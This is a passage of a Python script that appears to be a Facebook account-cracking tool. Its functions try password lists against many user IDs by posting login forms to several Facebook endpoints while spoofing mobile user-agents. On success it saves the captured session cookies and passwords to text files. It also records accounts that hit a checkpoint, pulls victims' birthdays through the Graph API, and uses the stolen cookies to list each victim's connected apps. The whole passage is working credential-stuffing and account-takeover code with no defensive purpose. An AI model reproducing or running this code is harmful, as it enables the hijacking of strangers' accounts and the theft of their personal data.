				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						print('\r %s--> %s • %s • %'%(H,user,pw,coki))
						cek_apk(coki)
						ok.append("%s • %s • %s "%(user,pw,coki))
						open('Ok.txt', 'a').write(" --> %s • %s • %s\n"%(user,pw,coki))
						break
					except (KeyError, IOError): 
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %s--> %s • %s • %s '%(H,user,pw,coki))
					cek_apk(coki)
					ok.append('%s • %s • %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s • %s • %s\n'%(user,pw,coki))
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						dihi = open('token.x', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={dihi}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s '%(K,user,pw))
						cp.append("%s • %s"%(user,pw,))
						open('Cp.txt', 'a').write(" --> %s • %s \n"%(user,pw))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %s--> %s • %s           '%(K,user,pw))
					cp.append('%s • %s'%(user,pw))
					open('Cp.txt', 'a').write(" --> %s | %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
                        time.sleep(31)
                        loop += 1
                        self.b_api(user,pwx)
	def metod2(self,user,pwx):
		global loop,ok,cp # METOK
		ram = random.choice([M,P,H,U,J,N,B])
		fikA = loop*100/len(self.id)
		nufikhaXD = '%'
		print('\r%s [Proses] %s/%s [OK:%s-CP:%s] >< %s%s%s '%(ram,loop,len(self.id),len(ok),len(cp),int(fikA),str(nufikhaXD),N), end=' ');sys.stdout.flush()
		ua = random.choice(ugen)
		ua2 = random.choice(ugen2)
		ses = requests.Session()
		for pw in pwx:
			try:
				tix = time.time()
				ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if "checkpoint" in po.cookies.get_dict().keys():
					print('\r %s--> %s • %s'%(K,user,pw))
					cp.append("%s|%s"%(user, pw))
					open("cp.txt","a").write("%s|%s\n"%(user, pw))
					open("checkcp.txt","a").write("--> %s|%s\n"%(user, pw))
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\r %s--> %s • %s                 %s'%(H,user,pw,N))
					cek_apk(coki)
					ok.append("%s|%s|%s"%(user, pw, coki))
					open("ok.txt","a").write("--> %s|%s|%s\n"%(user, pw, coki))
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
		loop+=1


	def mbasic(self,user,pwx):
		global loop,ok,cp
		asw = random.choice([M,K,H,U])
		mmk = random.choice([K,M,U,H])
		sys.stdout.write('\r %s* %s[%scrack%s] %s/%s [OK:%s CP:%s] %s* '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						coki =";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						nunu = open('token.x', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={nunu}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s • %s %s %s • %s'%(H,user,pw,day,month,year,coki))
						cek_apk(coki)
						ok.append("%s • %s • %s %s %s • %s "%(user,pw,day,month,year,kukis))
						open('Ok.txt', 'a').write(" --> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,coki))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %s--> %s • %s • %s'%(H,user,pw,coki))
					cek_apk(coki)
					ok.append('%s • %s • %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s ◊ %s ◊ %s\n'%(user,pw,coki))
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						nunu = open('token.x', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={nunu}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s • %s %s %s'%(K,user,pw,day,month,year))
						cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
						open('Cp.txt', 'a').write(" --> %s • %s • %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %s--> %s • %s'%(K,user,pw))
					cp.append('%s • %s'%(user,pw))
					open('Cp.txt', 'a').write(" --> %s • %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			time.sleep(31)
			loop += 1
			self.mbasic(user,pwx)

def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))


if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	menu()

